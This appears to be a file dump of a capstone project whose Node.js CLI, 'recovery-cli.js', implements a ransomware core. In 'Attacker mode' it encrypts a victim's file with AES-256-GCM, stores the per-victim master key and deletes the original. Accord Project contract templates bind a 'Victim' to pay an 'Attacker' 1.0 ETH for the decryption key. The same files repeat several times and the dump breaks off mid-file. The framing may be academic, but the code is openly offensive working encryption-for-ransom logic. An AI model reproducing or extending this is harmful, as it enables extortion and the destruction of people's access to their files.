
File: /opt/Capstone/encryption_data_1234.json
================================================================================
{
  "victimId": "1234",
  "fileId": "905a0001377f2db355dea08324f6ad009de5447cc24c64efe59e64d85a4ad390",
  "encryptedFile": "./files/secret.pem.encrypted",
  "commitment": "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214"
}
================================================================================


File: /opt/Capstone/commitment.txt
================================================================================
c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214
================================================================================


File: /opt/Capstone/file_collection.txt
================================================================================
File: /opt/Capstone/commitment.txt
================================================================================
c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214
================================================================================

File: /opt/Capstone/file_collection.txt
================================================================================

================================================================================

File: /opt/Capstone/steps.txt
================================================================================

node recovery-cli.js system-setup --victim 1234 --file ./files/secret.pem

node recovery-cli.js generate-commitment --file encryption_data_1234.json --output commitment.txt


recovery-cli init \
  --template ./templates/ransomware-template \
  --commitment ./commitment.txt \
  --victim 1234 \
  --attacker 5678 \
  --output contract.json

================================================================================

File: /opt/Capstone/recovery-cli.js
================================================================================
#!/usr/bin/env node



const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { Command } = require('commander');
const CiceroCore = require('@accordproject/cicero-core');
const Template = CiceroCore.Template;
const Clause = CiceroCore.Clause;

const Engine = require('@accordproject/cicero-engine').Engine;

const program = new Command();

class RansomwareSystem {
    constructor() {
        this.databaseFile = 'master_keys.json';
    }

    async generateMasterKey(victimId) {
        try {
            let database = {};
            try {
                const data = await fs.readFile(this.databaseFile, 'utf8');
                database = JSON.parse(data);
                if (database[victimId]) {
                    return Buffer.from(database[victimId], 'hex');
                }
            } catch (err) {
                // File doesn't exist or is invalid, continue with new database
            }

            const masterKey = crypto.randomBytes(32);
            database[victimId] = masterKey.toString('hex');
            await fs.writeFile(this.databaseFile, JSON.stringify(database, null, 2));
            return masterKey;
        } catch (error) {
            throw new Error(`Failed to generate master key: ${error.message}`);
        }
    }

    async encryptFile(filePath, victimId, masterKey) {
        try {
            // Generate file ID
            const fileId = crypto.createHash('sha256')
                .update(filePath)
                .digest('hex');
            
            // Generate decryption key for this specific file
            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKey,
                    Buffer.from(victimId),
                    Buffer.from(fileId)
                ]))
                .digest();

            // Read the file
            const fileContent = await fs.readFile(filePath);
            
            // Generate a random IV
            const iv = crypto.randomBytes(16);
            
            // Create cipher
            const cipher = crypto.createCipheriv('aes-256-gcm', decryptionKey, iv);
            
            // Encrypt the data
            let encrypted = cipher.update(fileContent);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            // Get the auth tag
            const authTag = cipher.getAuthTag();

            // Create the final encrypted file
            const encryptedFilePath = `${filePath}.encrypted`;
            
            // Write the IV, authTag and encrypted data
            await fs.writeFile(
                encryptedFilePath,
                Buffer.concat([iv, authTag, encrypted])
            );

            return { fileId, encryptedFilePath };
        } catch (error) {
            throw new Error(`Failed to encrypt file: ${error.message}`);
        }
    }

    generateCommitment(masterKey) {
        return crypto.createHash('sha256')
            .update(masterKey)
            .digest('hex');
    }
}

// Setup Commander.js
program
    .name('recovery-cli')
    .description('Ransomware Recovery Service CLI')
    .version('1.0.0');

program
    .command('system-setup')
    .description('Initialize the system and encrypt file (Attacker mode)')
    .requiredOption('-v, --victim <id>', 'Victim ID')
    .requiredOption('-f, --file <path>', 'File to encrypt')
    .action(async (options) => {
        try {
            const system = new RansomwareSystem();
            
            // Generate master key and encrypt file
            const masterKey = await system.generateMasterKey(options.victim);
            const { fileId, encryptedFilePath } = await system.encryptFile(options.file, options.victim, masterKey);
            
            // Generate commitment
            const commitment = system.generateCommitment(masterKey);

            // Save encryption data with commitment included
            const encryptionData = {
                victimId: options.victim,
                fileId: fileId,
                encryptedFile: encryptedFilePath,
                commitment: commitment // Include commitment in encryption data
            };

            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            await fs.writeFile(
                encryptionDataFile, 
                JSON.stringify(encryptionData, null, 2)
            );

            // Delete original file
            await fs.unlink(options.file);

            console.log('System setup complete:');
            console.log('- File encrypted:', encryptedFilePath);
            console.log('- Encryption data (with commitment) saved to:', encryptionDataFile);
            console.log('- Master key stored in:', system.databaseFile);
            console.log('- Original file deleted');
        } catch (error) {
            console.error('Error during setup:', error.message);
            process.exit(1);
        }
    });

// Remove any existing 'init' command definitions

// Add this command definition
program
    .command('init')
    .description('Initialize a new contract from template')
    .requiredOption('--template <path>', 'Path to template directory')
    .requiredOption('--commitment <path>', 'Path to commitment file')
    .requiredOption('--victim <id>', 'Victim ID')
    .requiredOption('--attacker <id>', 'Attacker ID')
    .requiredOption('--output <path>', 'Output contract JSON path')
    .action(async (options) => {
        try {
            console.log('Reading commitment from:', options.commitment);
            const commitment = await fs.readFile(options.commitment, 'utf8');

            console.log('Loading template from:', options.template);
            const template = await Template.fromDirectory(options.template);
            
            console.log('Template loaded successfully');

            // Generate contract ID
            const contractId = crypto.randomBytes(16).toString('hex');

            // Create contract data
            const data = {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContract',
                '$identifier': contractId,
                'buyer': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.victim,
                    'name': `Victim ${options.victim}`
                },
                'seller': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.attacker,
                    'name': `Attacker ${options.attacker}`
                },
                'paymentAmount': {
                    '$class': 'org.accordproject.money.MonetaryAmount',
                    'doubleValue': 1.0,
                    'currencyCode': 'ETH'
                },
                'fileCommitment': commitment.trim()
            };

            // Create contract JSON
            const contractJson = {
                contract: data,
                state: {
                    '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                    'status': {
                        '$class': 'org.accordproject.ransomware.recovery.ContractStatus',
                        '$identifier': 'CREATED'
                    }
                }
            };

            // Write to file
            await fs.writeFile(
                options.output,
                JSON.stringify(contractJson, null, 2)
            );

            console.log('Contract initialization complete:');
            console.log('- Contract created with ID:', contractId);
            console.log('- Contract created for victim:', options.victim);
            console.log('- Saved to:', options.output);

        } catch (error) {
            console.error('Error initializing contract:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });
    program.parse();

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar.tem.md
================================================================================
Upon verification of the provided master key against commitment ({{fileCommitment}}), {{buyer}} shall pay to {{seller}} the agreed amount ({{ransomAmount}}).

================================================================================

File: /opt/Capstone/templates/ransomware-template/.cucumber.js
================================================================================
require('@accordproject/cicero-test').Steps;

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================

File: /opt/Capstone/templates/ransomware-template/text/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/text/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================


================================================================================


File: /opt/Capstone/steps.txt
================================================================================

node recovery-cli.js system-setup --victim 1234 --file ./files/secret.pem

node recovery-cli.js generate-commitment --file encryption_data_1234.json --output commitment.txt


recovery-cli init \
  --template ./templates/ransomware-template \
  --commitment ./commitment.txt \
  --victim 1234 \
  --attacker 5678 \
  --output contract.json

================================================================================


File: /opt/Capstone/master_keys.json
================================================================================
{
  "1234": "8308ce8db3399860a5af2c5304ddc2e5f8995d5149b139cf68a7ac1fb95bda42"
}
================================================================================


File: /opt/Capstone/source_code_collection.txt
================================================================================

File: /opt/Capstone/encryption_data_1234.json
================================================================================
{
  "victimId": "1234",
  "fileId": "905a0001377f2db355dea08324f6ad009de5447cc24c64efe59e64d85a4ad390",
  "encryptedFile": "./files/secret.pem.encrypted",
  "commitment": "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214"
}
================================================================================


File: /opt/Capstone/commitment.txt
================================================================================
c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214
================================================================================


File: /opt/Capstone/file_collection.txt
================================================================================
File: /opt/Capstone/commitment.txt
================================================================================
c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214
================================================================================

File: /opt/Capstone/file_collection.txt
================================================================================

================================================================================

File: /opt/Capstone/steps.txt
================================================================================

node recovery-cli.js system-setup --victim 1234 --file ./files/secret.pem

node recovery-cli.js generate-commitment --file encryption_data_1234.json --output commitment.txt


recovery-cli init \
  --template ./templates/ransomware-template \
  --commitment ./commitment.txt \
  --victim 1234 \
  --attacker 5678 \
  --output contract.json

================================================================================

File: /opt/Capstone/recovery-cli.js
================================================================================
#!/usr/bin/env node



const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { Command } = require('commander');
const CiceroCore = require('@accordproject/cicero-core');
const Template = CiceroCore.Template;
const Clause = CiceroCore.Clause;

const Engine = require('@accordproject/cicero-engine').Engine;

const program = new Command();

class RansomwareSystem {
    constructor() {
        this.databaseFile = 'master_keys.json';
    }

    async generateMasterKey(victimId) {
        try {
            let database = {};
            try {
                const data = await fs.readFile(this.databaseFile, 'utf8');
                database = JSON.parse(data);
                if (database[victimId]) {
                    return Buffer.from(database[victimId], 'hex');
                }
            } catch (err) {
                // File doesn't exist or is invalid, continue with new database
            }

            const masterKey = crypto.randomBytes(32);
            database[victimId] = masterKey.toString('hex');
            await fs.writeFile(this.databaseFile, JSON.stringify(database, null, 2));
            return masterKey;
        } catch (error) {
            throw new Error(`Failed to generate master key: ${error.message}`);
        }
    }

    async encryptFile(filePath, victimId, masterKey) {
        try {
            // Generate file ID
            const fileId = crypto.createHash('sha256')
                .update(filePath)
                .digest('hex');
            
            // Generate decryption key for this specific file
            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKey,
                    Buffer.from(victimId),
                    Buffer.from(fileId)
                ]))
                .digest();

            // Read the file
            const fileContent = await fs.readFile(filePath);
            
            // Generate a random IV
            const iv = crypto.randomBytes(16);
            
            // Create cipher
            const cipher = crypto.createCipheriv('aes-256-gcm', decryptionKey, iv);
            
            // Encrypt the data
            let encrypted = cipher.update(fileContent);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            // Get the auth tag
            const authTag = cipher.getAuthTag();

            // Create the final encrypted file
            const encryptedFilePath = `${filePath}.encrypted`;
            
            // Write the IV, authTag and encrypted data
            await fs.writeFile(
                encryptedFilePath,
                Buffer.concat([iv, authTag, encrypted])
            );

            return { fileId, encryptedFilePath };
        } catch (error) {
            throw new Error(`Failed to encrypt file: ${error.message}`);
        }
    }

    generateCommitment(masterKey) {
        return crypto.createHash('sha256')
            .update(masterKey)
            .digest('hex');
    }
}

// Setup Commander.js
program
    .name('recovery-cli')
    .description('Ransomware Recovery Service CLI')
    .version('1.0.0');

program
    .command('system-setup')
    .description('Initialize the system and encrypt file (Attacker mode)')
    .requiredOption('-v, --victim <id>', 'Victim ID')
    .requiredOption('-f, --file <path>', 'File to encrypt')
    .action(async (options) => {
        try {
            const system = new RansomwareSystem();
            
            // Generate master key and encrypt file
            const masterKey = await system.generateMasterKey(options.victim);
            const { fileId, encryptedFilePath } = await system.encryptFile(options.file, options.victim, masterKey);
            
            // Generate commitment
            const commitment = system.generateCommitment(masterKey);

            // Save encryption data with commitment included
            const encryptionData = {
                victimId: options.victim,
                fileId: fileId,
                encryptedFile: encryptedFilePath,
                commitment: commitment // Include commitment in encryption data
            };

            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            await fs.writeFile(
                encryptionDataFile, 
                JSON.stringify(encryptionData, null, 2)
            );

            // Delete original file
            await fs.unlink(options.file);

            console.log('System setup complete:');
            console.log('- File encrypted:', encryptedFilePath);
            console.log('- Encryption data (with commitment) saved to:', encryptionDataFile);
            console.log('- Master key stored in:', system.databaseFile);
            console.log('- Original file deleted');
        } catch (error) {
            console.error('Error during setup:', error.message);
            process.exit(1);
        }
    });

// Remove any existing 'init' command definitions

// Add this command definition
program
    .command('init')
    .description('Initialize a new contract from template')
    .requiredOption('--template <path>', 'Path to template directory')
    .requiredOption('--commitment <path>', 'Path to commitment file')
    .requiredOption('--victim <id>', 'Victim ID')
    .requiredOption('--attacker <id>', 'Attacker ID')
    .requiredOption('--output <path>', 'Output contract JSON path')
    .action(async (options) => {
        try {
            console.log('Reading commitment from:', options.commitment);
            const commitment = await fs.readFile(options.commitment, 'utf8');

            console.log('Loading template from:', options.template);
            const template = await Template.fromDirectory(options.template);
            
            console.log('Template loaded successfully');

            // Generate contract ID
            const contractId = crypto.randomBytes(16).toString('hex');

            // Create contract data
            const data = {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContract',
                '$identifier': contractId,
                'buyer': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.victim,
                    'name': `Victim ${options.victim}`
                },
                'seller': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.attacker,
                    'name': `Attacker ${options.attacker}`
                },
                'paymentAmount': {
                    '$class': 'org.accordproject.money.MonetaryAmount',
                    'doubleValue': 1.0,
                    'currencyCode': 'ETH'
                },
                'fileCommitment': commitment.trim()
            };

            // Create contract JSON
            const contractJson = {
                contract: data,
                state: {
                    '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                    'status': {
                        '$class': 'org.accordproject.ransomware.recovery.ContractStatus',
                        '$identifier': 'CREATED'
                    }
                }
            };

            // Write to file
            await fs.writeFile(
                options.output,
                JSON.stringify(contractJson, null, 2)
            );

            console.log('Contract initialization complete:');
            console.log('- Contract created with ID:', contractId);
            console.log('- Contract created for victim:', options.victim);
            console.log('- Saved to:', options.output);

        } catch (error) {
            console.error('Error initializing contract:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });
    program.parse();

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar.tem.md
================================================================================
Upon verification of the provided master key against commitment ({{fileCommitment}}), {{buyer}} shall pay to {{seller}} the agreed amount ({{ransomAmount}}).

================================================================================

File: /opt/Capstone/templates/ransomware-template/.cucumber.js
================================================================================
require('@accordproject/cicero-test').Steps;

================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/grammar/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================

File: /opt/Capstone/templates/ransomware-template/text/sample.md
================================================================================
Upon verification of the decryption key against commitment "c5cb769909fb4aae0eec3b46574c14e0a0ef58adae5a3ea966ca81fda52aa214", "Victim 1234" shall pay to "Attacker 5678" the amount of 1.0 ETH.
================================================================================

File: /opt/Capstone/templates/ransomware-template/text/grammar.tem.md
================================================================================
Upon verification of the decryption key against commitment "{{% fileCommitment %}}", "{{% buyer.name %}}" shall pay to "{{% seller.name %}}" the amount of {{% paymentAmount %}}.

================================================================================


================================================================================


File: /opt/Capstone/package.json
================================================================================
{
  "name": "ransomware-recovery",
  "displayName": "Ransomware Recovery Contract",
  "version": "0.1.0",
  "description": "This is a ransomware recovery contract template using the Accord Project.",
  "author": "Accord Project",
  "license": "Apache-2.0",
  "accordproject": {
      "template": "contract",
      "cicero": "^0.24.0"
  },
  "devDependencies": {
      "@accordproject/cicero-core": "^0.24.0",
      "@accordproject/cicero-engine": "^0.24.0",
      "@accordproject/ergo-compiler": "^0.24.0",
      "cucumber": "^5.1.0"
  },
  "scripts": {
      "test": "cucumber-js test -r .cucumber.js"
  }
}
================================================================================


File: /opt/Capstone/recovery-cli.js
================================================================================
#!/usr/bin/env node



const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { Command } = require('commander');
const CiceroCore = require('@accordproject/cicero-core');
const Template = CiceroCore.Template;
const Clause = CiceroCore.Clause;

const Engine = require('@accordproject/cicero-engine').Engine;

const program = new Command();

class RansomwareSystem {
    constructor() {
        this.databaseFile = 'master_keys.json';
    }

    async generateMasterKey(victimId) {
        try {
            let database = {};
            try {
                const data = await fs.readFile(this.databaseFile, 'utf8');
                database = JSON.parse(data);
                if (database[victimId]) {
                    return Buffer.from(database[victimId], 'hex');
                }
            } catch (err) {
                // File doesn't exist or is invalid, continue with new database
            }

            const masterKey = crypto.randomBytes(32);
            database[victimId] = masterKey.toString('hex');
            await fs.writeFile(this.databaseFile, JSON.stringify(database, null, 2));
            return masterKey;
        } catch (error) {
            throw new Error(`Failed to generate master key: ${error.message}`);
        }
    }

    async encryptFile(filePath, victimId, masterKey) {
        try {
            // Generate file ID
            const fileId = crypto.createHash('sha256')
                .update(filePath)
                .digest('hex');
            
            // Generate decryption key for this specific file
            const decryptionKey = crypto.createHash('sha256')
                .update(Buffer.concat([
                    masterKey,
                    Buffer.from(victimId),
                    Buffer.from(fileId)
                ]))
                .digest();

            // Read the file
            const fileContent = await fs.readFile(filePath);
            
            // Generate a random IV
            const iv = crypto.randomBytes(16);
            
            // Create cipher
            const cipher = crypto.createCipheriv('aes-256-gcm', decryptionKey, iv);
            
            // Encrypt the data
            let encrypted = cipher.update(fileContent);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            // Get the auth tag
            const authTag = cipher.getAuthTag();

            // Create the final encrypted file
            const encryptedFilePath = `${filePath}.encrypted`;
            
            // Write the IV, authTag and encrypted data
            await fs.writeFile(
                encryptedFilePath,
                Buffer.concat([iv, authTag, encrypted])
            );

            return { fileId, encryptedFilePath };
        } catch (error) {
            throw new Error(`Failed to encrypt file: ${error.message}`);
        }
    }

    generateCommitment(masterKey) {
        return crypto.createHash('sha256')
            .update(masterKey)
            .digest('hex');
    }
}

// Setup Commander.js
program
    .name('recovery-cli')
    .description('Ransomware Recovery Service CLI')
    .version('1.0.0');

program
    .command('system-setup')
    .description('Initialize the system and encrypt file (Attacker mode)')
    .requiredOption('-v, --victim <id>', 'Victim ID')
    .requiredOption('-f, --file <path>', 'File to encrypt')
    .action(async (options) => {
        try {
            const system = new RansomwareSystem();
            
            // Generate master key and encrypt file
            const masterKey = await system.generateMasterKey(options.victim);
            const { fileId, encryptedFilePath } = await system.encryptFile(options.file, options.victim, masterKey);
            
            // Generate commitment
            const commitment = system.generateCommitment(masterKey);

            // Save encryption data with commitment included
            const encryptionData = {
                victimId: options.victim,
                fileId: fileId,
                encryptedFile: encryptedFilePath,
                commitment: commitment // Include commitment in encryption data
            };

            const encryptionDataFile = `encryption_data_${options.victim}.json`;
            await fs.writeFile(
                encryptionDataFile, 
                JSON.stringify(encryptionData, null, 2)
            );

            // Delete original file
            await fs.unlink(options.file);

            console.log('System setup complete:');
            console.log('- File encrypted:', encryptedFilePath);
            console.log('- Encryption data (with commitment) saved to:', encryptionDataFile);
            console.log('- Master key stored in:', system.databaseFile);
            console.log('- Original file deleted');
        } catch (error) {
            console.error('Error during setup:', error.message);
            process.exit(1);
        }
    });

// Remove any existing 'init' command definitions

// Add this command definition
program
    .command('init')
    .description('Initialize a new contract from template')
    .requiredOption('--template <path>', 'Path to template directory')
    .requiredOption('--commitment <path>', 'Path to commitment file')
    .requiredOption('--victim <id>', 'Victim ID')
    .requiredOption('--attacker <id>', 'Attacker ID')
    .requiredOption('--output <path>', 'Output contract JSON path')
    .action(async (options) => {
        try {
            console.log('Reading commitment from:', options.commitment);
            const commitment = await fs.readFile(options.commitment, 'utf8');

            console.log('Loading template from:', options.template);
            const template = await Template.fromDirectory(options.template);
            
            console.log('Template loaded successfully');

            // Generate contract ID
            const contractId = crypto.randomBytes(16).toString('hex');

            // Create contract data
            const data = {
                '$class': 'org.accordproject.ransomware.recovery.RansomwareContract',
                '$identifier': contractId,
                'buyer': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.victim,
                    'name': `Victim ${options.victim}`
                },
                'seller': {
                    '$class': 'org.accordproject.party.Party',
                    'partyId': options.attacker,
                    'name': `Attacker ${options.attacker}`
                },
                'paymentAmount': {
                    '$class': 'org.accordproject.money.MonetaryAmount',
                    'doubleValue': 1.0,
                    'currencyCode': 'ETH'
                },
                'fileCommitment': commitment.trim()
            };

            // Create contract JSON
            const contractJson = {
                contract: data,
                state: {
                    '$class': 'org.accordproject.ransomware.recovery.RansomwareContractState',
                    'status': {
                        '$class': 'org.accordproject.ransomware.recovery.ContractStatus',
                        '$identifier': 'CREATED'
                    }
                }
            };

            // Write to file
            await fs.writeFile(
                options.output,
                JSON.stringify(contractJson, null, 2)
            );

            console.log('Contract initialization complete:');
            console.log('- Contract created with ID:', contractId);
            console.log('- Contract created for victim:', options.victim);
            console.log('- Saved to:', options.output);

        } catch (error) {
            console.error('Error initializing contract:', error.message);
            if (error.stack) {
                console.error('Stack trace:', error.stack);
            }
            process.exit(1);
        }
    });
    program.parse();

================================================================================


File: /opt/Capstone/templates/ransomware-template/grammar.tem.md
================================================================================
Upon verification of the provided master key against commitment ({{fileCommitment}}), {{buyer}} shall pay to {{seller}} the agreed amount ({{ransomAmount}}).

================================================================================


File: /opt/Capstone/templates/ransomware-template/.cucumber.js
================================================================================
require('@accordproject/cicero-test').Steps;

================================================================================


File: /opt/Capstone/templates/ransomware-template/package.json
================================================================================
{
  "name": "ransomware-recovery-template",
  "version": "0.1.0",
  "description": "Template for ransomware recovery agreements",
  "accordproject": {
    "template": "contract",
    "cicero": "^0.24.0"
  },
  "devDependencies": {
    "@accordproject/cicero-core": "^0.24.0",
    "@accordproject/cicero-engine": "^0.24.0",
    "@accordproject/ergo-compiler": "^0.24.0"
  },
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "Apache-2.0"
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.accordproject.contract.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

concerto version ">= 1.0.0"

namespace org.accordproject.contract

/**
 * Contract Data
 * -- Describes the structure of contracts and clauses
 */

/* A contract is a asset -- This contains the contract data */
abstract asset Contract identified by contractId {
  o String contractId
}

/* A clause is an asset -- This contains the clause data */
abstract asset Clause identified by clauseId {
  o String clauseId
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.money@0.2.0.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace org.accordproject.money

/**
 * Represents an amount of Cryptocurrency
 */
concept DigitalMonetaryAmount {
  o Double doubleValue
  o DigitalCurrencyCode digitalCurrencyCode
}

/**
 * Digital Currency codes. From https://en.wikipedia.org/wiki/List_of_cryptocurrencies
 */
enum DigitalCurrencyCode {
  o ADA
  o BCH
  o BTC
  o DASH
  o EOS
  o ETC
  o ETH
  o LTC
  o NEO
  o XLM
  o XMR
  o XRP
  o ZEC
}

/**
 * Represents an amount of money
 */
concept MonetaryAmount {
  o Double doubleValue // convert to fixed-point?
  o CurrencyCode currencyCode
}

/**
 * ISO 4217 codes. From https://en.wikipedia.org/wiki/ISO_4217
 * https://www.currency-iso.org/en/home/tables/table-a1.html
 */
enum CurrencyCode {
o AED
o AFN
o ALL
o AMD
o ANG
o AOA
o ARS
o AUD
o AWG
o AZN
o BAM
o BBD
o BDT
o BGN
o BHD
o BIF
o BMD
o BND
o BOB
o BOV
o BRL
o BSD
o BTN
o BWP
o BYN
o BZD
o CAD
o CDF
o CHE
o CHF
o CHW
o CLF
o CLP
o CNY
o COP
o COU
o CRC
o CUC
o CUP
o CVE
o CZK
o DJF
o DKK
o DOP
o DZD
o EGP
o ERN
o ETB
o EUR
o FJD
o FKP
o GBP
o GEL
o GHS
o GIP
o GMD
o GNF
o GTQ
o GYD
o HKD
o HNL
o HRK
o HTG
o HUF
o IDR
o ILS
o INR
o IQD
o IRR
o ISK
o JMD
o JOD
o JPY
o KES
o KGS
o KHR
o KMF
o KPW
o KRW
o KWD
o KYD
o KZT
o LAK
o LBP
o LKR
o LRD
o LSL
o LYD
o MAD
o MDL
o MGA
o MKD
o MMK
o MNT
o MOP
o MRU
o MUR
o MVR
o MWK
o MXN
o MXV
o MYR
o MZN
o NAD
o NGN
o NIO
o NOK
o NPR
o NZD
o OMR
o PAB
o PEN
o PGK
o PHP
o PKR
o PLN
o PYG
o QAR
o RON
o RSD
o RUB
o RWF
o SAR
o SBD
o SCR
o SDG
o SEK
o SGD
o SHP
o SLL
o SOS
o SRD
o SSP
o STN
o SVC
o SYP
o SZL
o THB
o TJS
o TMT
o TND
o TOP
o TRY
o TTD
o TWD
o TZS
o UAH
o UGX
o USD
o USN
o UYI
o UYU
o UZS
o VEF
o VND
o VUV
o WST
o XAF
o XAG
o XAU
o XBA
o XBB
o XBC
o XBD
o XCD
o XDR
o XOF
o XPD
o XPF
o XPT
o XSU
o XTS
o XUA
o XXX
o YER
o ZAR
o ZMW
o ZWL
}

/**
 * Represents a currency conversion pair and exchange rate
 */
concept CurrencyConversion {
   o CurrencyCode from
   o CurrencyCode to
   o Double rate
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/model.cto
================================================================================
namespace org.accordproject.ransomware.recovery

import org.accordproject.contract.* from https://models.accordproject.org/accordproject/contract.cto
import org.accordproject.party.Party from https://models.accordproject.org/accordproject/party.cto
import org.accordproject.runtime.* from https://models.accordproject.org/accordproject/runtime.cto
import org.accordproject.obligation.* from https://models.accordproject.org/accordproject/obligation.cto
import org.accordproject.money.MonetaryAmount from https://models.accordproject.org/money@0.2.0.cto

/**
 * The template model
 */
asset RansomwareContract extends Contract {
  --> Party buyer
  --> Party seller
  o MonetaryAmount paymentAmount
  o String fileCommitment
}

/**
 * The status enum
 */
enum ContractStatus {
  o CREATED
  o PAYMENT_PENDING
  o COMPLETED
}

/**
 * Defines the state of the contract
 */
asset RansomwareContractState extends State {
  o ContractStatus status
}

/**
 * Transaction types
 */
transaction DecryptionRequest extends Request {
  o String decryptionKey
}

transaction DecryptionResponse extends Response {
  o Boolean success
  o String message
}
================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.accordproject.party.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

concerto version ">= 1.0.0"

namespace org.accordproject.party

/* A party to a contract */
participant Party identified by partyId {
  o String partyId
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.accordproject.obligation.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

concerto version ">= 1.0.0"

namespace org.accordproject.obligation

import org.accordproject.runtime.Obligation from https://models.accordproject.org/accordproject/runtime.cto
import org.accordproject.money.MonetaryAmount from https://models.accordproject.org/money@0.2.0.cto

/**
 * Useful Obligations
 * -- Predefined obligations for general use in Accord Project templates
 */

event PaymentObligation extends Obligation {
  o MonetaryAmount amount
  o String description
}

event NotificationObligation extends Obligation {
  o String title
  o String message
}

================================================================================


File: /opt/Capstone/templates/ransomware-template/model/@models.accordproject.org.money.cto
================================================================================
/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace org.accordproject.money

/**
 * Represents an amount of Cryptocurrency
 */
concept CryptoMonetaryAmount {
  o Double doubleValue
